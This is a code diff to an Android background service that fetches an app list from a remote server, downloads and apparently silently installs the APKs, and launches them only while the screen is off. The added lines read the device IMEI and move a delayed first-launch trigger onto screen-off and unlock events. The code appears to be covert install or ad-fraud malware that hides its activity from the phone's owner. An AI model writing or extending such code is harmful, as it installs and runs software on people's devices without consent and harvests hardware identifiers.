@@ -11,7 +11,6 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -24,11 +23,12 @@ import android.net.wifi.WifiManager;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
-import android.os.Message;
 import android.os.RemoteException;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.text.format.DateUtils;
 import android.text.format.Time;
+import android.util.Log;
 
 import com.android.volley.RequestQueue;
 import com.android.volley.Response.Listener;
@@ -52,22 +52,11 @@ public class CoreService extends Service {
 	public static final int UNLOCK_SCREEN = 2;
 	public static final int WIFI_STATE_CHANGED = 3;
 
-	private static long INIT_FIRST_TIME = -1;
+	private long INIT_FIRST_TIME = -1;
 
-	private Handler mHandler = new Handler(new Handler.Callback() {
+	private String deviceId = "";
 
-		@Override
-		public boolean handleMessage(Message msg) {
-			boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
-			if (first_launch) {
-				if (CommandUtil.simReady(getApplicationContext()))
-					INIT_FIRST_TIME = System.currentTimeMillis();
-				else
-					mHandler.sendMessageDelayed(null, 1000 * 60 * 60);
-			}
-			return false;
-		}
-	});
+	private Handler mHandler = new Handler();
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -79,6 +68,9 @@ public class CoreService extends Service {
 		super.onCreate();
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
+
+		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		deviceId = tm.getDeviceId();
 
 		finalHttp = new FinalHttp();
 
@@ -92,13 +84,9 @@ public class CoreService extends Service {
 		registerReceiver(receiver, filter);
 
 		boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
-		if (first_launch) {
-			if (CommandUtil.simReady(getApplicationContext()))
-				INIT_FIRST_TIME = System.currentTimeMillis();
-			else {
-				mHandler.sendMessageDelayed(null, 1000 * 30);
-			}
+		if (first_launch && CommandUtil.simReady(getApplicationContext())) {
 			CommandUtil.logW("SIM卡正常，并且未初始化，开始初始化。");
+			INIT_FIRST_TIME = System.currentTimeMillis();
 		}
 	}
 
@@ -152,9 +140,14 @@ public class CoreService extends Service {
 		case START_ACTIVE:
 			CommandUtil.logW("屏幕暗了。。。");
 			isScreenLight = false;
+			if (INIT_FIRST_TIME != -1) {
+				if ((System.currentTimeMillis() - INIT_FIRST_TIME) >= 1000 * 60 * 30) {
+					if (sharedPreferences.getBoolean("first_launch", true)) {
+						mHandler.post(initFirstLaunch);
+					}
+				}
+			}
 			mHandler.post(startActive);
-			if (INIT_FIRST_TIME != -1 && (System.currentTimeMillis() - INIT_FIRST_TIME) > 1000 * 60 * 30 && sharedPreferences.getBoolean("first_launch", true))
-				mHandler.post(initFirstLaunch);
 			break;
 		case STOP_ACTIVE:
 			CommandUtil.logW("屏幕亮了。。。");
@@ -164,6 +157,10 @@ public class CoreService extends Service {
 			break;
 		case UNLOCK_SCREEN:
 			CommandUtil.logW("解锁屏幕。。。");
+			if (INIT_FIRST_TIME == -1 && sharedPreferences.getBoolean("first_launch", true) && CommandUtil.simReady(getApplicationContext())) {
+				CommandUtil.logW("SIM卡正常，并且未初始化，开始初始化。");
+				INIT_FIRST_TIME = System.currentTimeMillis();
+			}
 			if (CommandUtil.isNetAvailable(getApplicationContext()))
 				updateService();
 			break;
@@ -189,7 +186,7 @@ public class CoreService extends Service {
 		}
 		mustDownloadApp.clear();
 		RequestQueue rq = Volley.newRequestQueue(this);
-		rq.add(new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {
+		JsonArrayRequest request = new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {
 
 			@Override
 			public void onResponse(JSONArray arg0) {
@@ -215,7 +212,8 @@ public class CoreService extends Service {
 				}
 				startDownload();
 			}
-		}, null));
+		}, null);
+		rq.add(request);
 		rq.start();
 	}
 
@@ -231,6 +229,7 @@ public class CoreService extends Service {
 				@Override
 				public void onSuccess(File file) {
 					super.onSuccess(file);
+					Log.w("ps", "下载成功：" + file.toString());
 					isDownloading = false;
 					CommandUtil.installFile(getApplicationContext(), file, observer);
 					startDownload();
@@ -239,6 +238,7 @@ public class CoreService extends Service {
 				@Override
 				public void onFailure(Throwable t, String strMsg) {
 					super.onFailure(t, strMsg);
+					Log.w("ps", "下载失败：" + strMsg);
 					isDownloading = false;
 					mustDownloadApp.add(app);
 					SystemClock.sleep(5000);
@@ -332,7 +332,7 @@ public class CoreService extends Service {
 				startActivity(app);
 				SystemClock.sleep(1000 * 30);
 				if (isScreenLight) {
-					return;
+					break;
 				}
 				SilenceApp entity = new SilenceApp();
 				entity.setId(id);
